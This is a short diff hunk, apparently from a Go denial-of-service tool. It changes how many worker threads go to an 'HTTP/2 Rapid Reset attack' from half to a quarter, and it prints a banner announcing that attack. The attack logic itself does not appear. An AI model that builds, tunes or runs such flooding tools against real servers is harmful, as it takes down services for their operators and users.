@@ -888,7 +888,7 @@ func main() {
 
 	// If HTTP/2 is supported, use 50% of workers for Rapid Reset
 	if h2Supported && mode == "GET" {
-		rapidWorkers := workers / 2
+		rapidWorkers := workers / 4
 		normalWorkers := workers - rapidWorkers
 
 		fmt.Printf("[+] HTTP/2 detected! Using %d workers for Rapid Reset attack\n", rapidWorkers)
